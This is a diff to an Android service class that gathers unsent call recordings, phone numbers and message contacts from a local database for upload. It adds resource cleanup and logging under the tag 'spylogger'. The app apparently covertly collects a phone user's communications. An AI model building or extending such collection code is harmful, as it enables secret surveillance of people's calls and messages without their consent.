@@ -15,6 +15,7 @@ import com.j256.ormlite.dao.GenericRawResults;
 import com.j256.ormlite.field.DataType;
 import com.j256.ormlite.stmt.UpdateBuilder;
 
+import java.io.IOException;
 import java.sql.SQLException;
 import java.util.ArrayList;
 import java.util.Date;
@@ -45,9 +46,10 @@ public class SendGravacoesService extends SendDataService<RespostaRecebimentoVO>
 
     public boolean enviarTopicos() {
         DatabaseHelper dbHelper = new DatabaseHelper(context);
+        GenericRawResults<String[]> raws=null;
         try {
             Dao<Topico, Integer> daoTopicos = dbHelper.getDao(Topico.class);
-            GenericRawResults<String[]> raws = daoTopicos.queryRaw("select id,nome,grupo,tipoMensagem,(select group_concat(contato,'#') from ( select distinct contato from mensagem where topico_id=top.id)) from topico top where top.enviado=0 ");
+            raws = daoTopicos.queryRaw("select id,nome,grupo,tipoMensagem,(select group_concat(contato,'#') from ( select distinct contato from mensagem where topico_id=top.id)) from topico top where top.enviado=0 ");
 
             List<Topico> topicos = new ArrayList<>();
             int contador = 0;
@@ -79,6 +81,13 @@ public class SendGravacoesService extends SendDataService<RespostaRecebimentoVO>
 
         } catch (SQLException e) {
             Log.e(this.getClass().getSimpleName(), e.getMessage());
+        }finally {
+            try {
+                if (raws != null) {
+                    raws.close();
+                }
+            } catch (IOException ee) {
+            }
         }
 
         return true;
@@ -86,16 +95,18 @@ public class SendGravacoesService extends SendDataService<RespostaRecebimentoVO>
 
     private void enviarLigacoes(){
         DatabaseHelper dbHelper = new DatabaseHelper(context);
+        GenericRawResults<Object[]> raws=null;
         try {
             Dao<Ligacao, Integer> daoMensagem = dbHelper.getDao(Ligacao.class);
 
-            GenericRawResults<Object[]> raws = daoMensagem.queryRaw("select id,data,audio,numero,remetente,duracao,nome,topico_id from ligacao where enviado=0",
+            raws = daoMensagem.queryRaw("select id,data,audio,numero,remetente,duracao,nome,topico_id from ligacao where enviado=0",
                     new DataType[]{DataType.INTEGER,DataType.DATE_LONG,DataType.STRING,DataType.STRING,DataType.BOOLEAN_INTEGER,DataType.LONG,DataType.STRING,DataType.INTEGER});
             List<Ligacao> ligacoes = new ArrayList<>();
             int contador = 0;
             Iterator<Object[]> iterator = raws.iterator();
             while (iterator.hasNext()) {
-                Object[] resultRaw = iterator.next();
+                Object[]  resultRaw = iterator.next();
+
                 try {
 
                     Ligacao ligacao=new Ligacao();
@@ -110,7 +121,7 @@ public class SendGravacoesService extends SendDataService<RespostaRecebimentoVO>
 
                     ligacoes.add(ligacao);
                 } catch (Exception e) {
-                    e.printStackTrace();
+                    Log.e("spylogger",e.getMessage());
                 }
                 contador++;
                 if (iterator.hasNext()) {
@@ -124,8 +135,15 @@ public class SendGravacoesService extends SendDataService<RespostaRecebimentoVO>
                     enviarLigacoes(ligacoes);
                 }
             }
-        }catch (SQLException e){
-            e.printStackTrace();
+        }catch (Exception e){
+            Log.e("spylogger",e.getMessage());
+        }finally {
+            try {
+                if (raws != null) {
+                    raws.close();
+                }
+            } catch (IOException ee) {
+            }
         }
     }
 
